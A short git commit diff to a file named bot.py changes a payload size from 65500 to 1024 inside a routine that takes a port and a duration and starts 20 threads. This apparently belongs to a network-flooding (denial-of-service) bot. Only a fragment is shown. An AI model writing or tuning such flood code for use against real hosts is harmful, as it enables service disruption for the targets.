d75b8e233339f114c5344fa7a57204d24614b1dc
Bss Development Store <157105843+BssStore@users.noreply.github.com>
2024-05-13 16:53:43 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -205,7 +205,7 @@ def main():
                     port = int(args[2])
                     duration = int(args[3])
                     end_time = time.time() + duration
-                    size = 65500
+                    size = 1024
                     threads = 20
 
                     for _ in range(threads):
